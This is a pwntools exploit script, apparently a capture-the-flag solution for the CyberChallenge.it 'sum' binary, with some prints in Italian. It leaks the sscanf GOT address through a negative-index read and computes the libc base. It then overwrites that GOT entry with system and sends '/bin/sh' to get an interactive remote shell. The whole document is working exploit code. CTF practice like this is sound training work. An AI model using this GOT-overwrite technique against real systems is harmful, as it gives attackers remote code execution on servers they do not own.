from pwn import *

HOST = "sum.challs.cyberchallenge.it"
PORT = 9134

p = remote(HOST, PORT)

exe = ELF("sum")
context.binary = exe

got_scanf_addr = exe.sym.got.__isoc99_sscanf//8
abs_addr_scanf = 0x0017c4e0
abs_syst_addr = 0x0014f440

p.sendlineafter(b"> ", b"-1")
p.recvuntil(b"> ")
p.clean()
p.sendline(b"get " + str(got_scanf_addr).encode())
addr = int(p.recvline()[:-1])
print(f"\n\n\nRelavite scanf addr: {addr}")


libc_base = addr - abs_addr_scanf
print(f"Indirizzo base di libc: {libc_base}")
syst_addr = libc_base + abs_syst_addr

print(f"Indirizzo di system: {syst_addr}")

p.sendline(b"set " + str(got_scanf_addr).encode() + b" " + str(syst_addr).encode())
p.sendline(b"/bin/sh")
p.interactive()